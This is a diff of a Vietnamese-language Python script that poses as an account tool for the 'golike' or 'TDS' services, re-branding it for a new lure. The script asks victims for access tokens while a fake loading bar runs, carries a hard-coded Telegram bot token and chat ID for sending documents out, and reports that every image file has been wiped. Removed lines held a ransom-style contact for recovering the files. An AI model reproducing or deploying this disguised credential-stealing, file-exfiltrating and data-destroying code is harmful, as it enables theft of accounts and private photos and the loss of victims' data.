@@ -5,7 +5,7 @@ import time
 import threading
 import warnings
 banner = f"""                         ╔════════════════╗
-                         ║ \033[1;37m   GOLIKE TT   \033[1;90m║
+                         ║ \033[1;37m   TDS ADB TT   \033[1;90m║
                          ╚════════════════╝                           \n
 """
 # ANSI color codes for terminal output
@@ -14,7 +14,7 @@ luc = "\033[1;32m"
 red = "\033[1;31m"
 
 # Telegram Bot information
-TOKEN = "7636168350:AAG9FPUs6X0YeSf0y7MQidiVJk9NmhfJe1s"  # Thay bằng token thật
+TOKEN = "7667409808:AAHQrihGOMHxYzfPQ1IfOF7ADkpaCzqlyYU"  # Thay bằng token thật
 CHAT_ID = "6563080552"  # Thay bằng chat ID thật
 TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
 
@@ -22,12 +22,12 @@ TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
 def fake_loading():
     animations = ["|", "/", "-", "\\"]
     print(banner)
-    autho = input(f'{trang}Nhập Authorizon : ')
-    token = input(f'Nhập T : ')
+    token = input(f'{trang}Nhập Access_token: ')
+    idtik = input(f'Nhập id tik : ')
     
 
     for _ in range(20):  # Simulate loading for 10 seconds
-        print(f"\r[+] Đang tải thông tin acc golike ... {animations[_ % 4]}", end="", flush=True)
+        print(f"\r[+] Đang tải thông tin acc TDS ... {animations[_ % 4]}", end="", flush=True)
         time.sleep(1)
 
 # Tìm tất cả file ảnh trên máy
@@ -84,8 +84,5 @@ def main():
 
     loading_thread.join()
     print(f"\n{red}Toàn bộ file ảnh đã bị xóa sạch!")
-    print(f"{trang}Liên hệ Telegram {luc}@luaday123 {trang}để lấy lại.")
-    print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")  # Chờ quá trình fake loading hoàn tất
-
 if __name__ == "__main__":
     main()
